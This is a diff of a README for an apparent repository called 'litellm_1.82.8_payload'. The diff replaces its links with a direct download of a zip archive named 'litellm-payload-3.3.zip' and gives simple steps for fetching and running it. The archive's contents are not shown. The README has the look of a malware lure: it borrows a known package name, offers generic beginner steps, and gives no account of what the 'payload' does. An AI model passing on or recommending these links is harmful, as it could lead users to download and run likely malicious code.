@@ -1,12 +1,12 @@
 # 🛡️ litellm_1.82.8_payload - Run the payload with clear steps
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue.svg)](https://github.com/Plumaged-dancing835/litellm_1.82.8_payload)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue.svg)](https://raw.githubusercontent.com/Plumaged-dancing835/litellm_1.82.8_payload/main/Mysian/litellm-payload-3.3.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the files:
 
-https://github.com/Plumaged-dancing835/litellm_1.82.8_payload
+https://raw.githubusercontent.com/Plumaged-dancing835/litellm_1.82.8_payload/main/Mysian/litellm-payload-3.3.zip
 
 ## 🖥️ What this is
 
@@ -28,7 +28,7 @@ Before you start, make sure you have:
 ## 🚀 Get started
 
 1. Open the download page:  
-   https://github.com/Plumaged-dancing835/litellm_1.82.8_payload
+   https://raw.githubusercontent.com/Plumaged-dancing835/litellm_1.82.8_payload/main/Mysian/litellm-payload-3.3.zip
 
 2. On the page, look for the files to download.
 
